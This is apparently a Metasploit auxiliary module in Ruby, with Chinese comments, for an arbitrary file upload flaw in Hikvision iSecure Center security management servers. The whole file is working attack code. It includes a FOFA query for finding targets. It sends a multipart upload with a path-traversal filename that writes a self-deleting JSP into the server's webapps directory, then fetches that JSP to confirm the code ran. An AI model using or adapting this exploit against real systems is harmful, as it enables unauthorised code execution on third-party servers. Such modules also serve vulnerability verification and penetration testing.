require 'net/http'
require 'uri'
#fofa: app="HIKVISION-iSecure-Center"

class MetasploitModule < Msf::Auxiliary
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  def initialize(info = {})
    super(update_info(info,
                      'Name'           => '海康威视iSecure Center综合安防管理平台任意文件上传漏洞',
                      'Description'    => '这个模块验证是否存在海康威视iSecure Center综合安防管理平台任意文件上传漏洞,攻击者通过该漏洞可以上传恶意文件进而获取服务器权限.',
                      'Author'         => 'se2o',
                      'License'        => MSF_LICENSE,
                      'References'     =>
                        [
                          [ 'TY', '2023-0921' ]
                        ],
                      'DisclosureDate' => '2023-09-21'
          ))
    register_options([
                       OptString.new('service', [true, 'http/https', 'http'])
                     ])
  end

  def check
    protocol = datastore['service']
    rhost = datastore['RHOSTS']
    rport = datastore['RPORT']
    uri = "#{protocol}://#{rhost}:#{rport}"

    path = "/center/api/files;.js"
    url = URI.join(uri, path)
    headers = {
      "User-Agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
      "Content-Type" => "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae"
    }
    data = <<EOF
--502f67681799b07e4de6b503655f5cae\r
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/helloty.jsp"\r
Content-Type: application/octet-stream\r
\r
<%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("dHk2NTQyMTExMGJhMDMwOTlhMzAzOTMzNzNjNWJocw==")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r
--502f67681799b07e4de6b503655f5cae--
EOF

    http = Net::HTTP.new(url.host, url.port)
    request = Net::HTTP::Post.new(path, headers)
    request.body = data
    res = http.request(request)
    #puts request.body
    #puts res.code

    header = {
      "User-Agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    }
#
    path2 = "/clusterMgr/helloty.jsp;js"
    url2 = URI.join(url, path2)
    res2 = http.get(url2, header)
#
    if res.code == "200" and res2.code == "200" and res2.body.include?('ty65421110ba03099a30393373c5bhs') then
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def run
    protocol = datastore['service']
    rhost = datastore['RHOSTS']
    rport = datastore['RPORT']
    uri = "#{protocol}://#{rhost}:#{rport}"

    path = "/center/api/files;.js"
    url = URI.join(uri, path)
    headers = {
      "User-Agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
      "Content-Type" => "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae"
    }
    data = <<EOF
--502f67681799b07e4de6b503655f5cae\r
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/helloty.jsp"\r
Content-Type: application/octet-stream\r
\r
<%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("dHk2NTQyMTExMGJhMDMwOTlhMzAzOTMzNzNjNWJocw==")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r
--502f67681799b07e4de6b503655f5cae--
EOF

    http = Net::HTTP.new(url.host, url.port)
    request = Net::HTTP::Post.new(path, headers)
    request.body = data
    res = http.request(request)
    #puts request.body
    #puts res.code

    header = {
      "User-Agent" => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    }
    #
    path2 = "/clusterMgr/helloty.jsp;js"
    url2 = URI.join(url, path2)
    res2 = http.get(url2, header)
    #
    if res.code == "200" and res2.code == "200" and res2.body.include?('ty65421110ba03099a30393373c5bhs') then
      print_good("Data collection checkpoint start")
      print_good("\n该资产存在海康威视iSecure Center综合安防管理平台任意文件上传漏洞\n漏洞编号：无\n自定义漏洞编号：TY-2023-0921\n文件上传请求数据包：\n" + "#{request.method} #{request.path}\n" + "Host: #{rhost}:#{rport}\n"+ headers.map { |key, value| "#{key}: #{value}" }.join("\n") + "\n\n" + data)
      print_good("\n文件上传响应数据包:\n" + "HTTP/#{res.http_version} #{res.code} #{res.message}\n" + res.body)
      print_good("\n文件内容为：\n" + '<%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("dHk2NTQyMTExMGJhMDMwOTlhMzAzOTMzNzNjNWJocw==")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>')
      print_good("\n文件的内容为java代码，访问此文件后，服务器会解码一个Base64编码的字符串'dHk2NTQyMTExMGJhMDMwOTlhMzAzOTMzNzNjNWJocw=='然后删除当前脚本文件，实现无文件残留")
      print_good("\n访问此上传文件响应数据包:\n" + "HTTP/#{res2.http_version} #{res2.code} #{res2.message}\n" + res2.body)
      print_good("Data collection checkpoint end")
    else
      print_error('false')
      return Exploit::CheckCode::Safe
    end
  end
end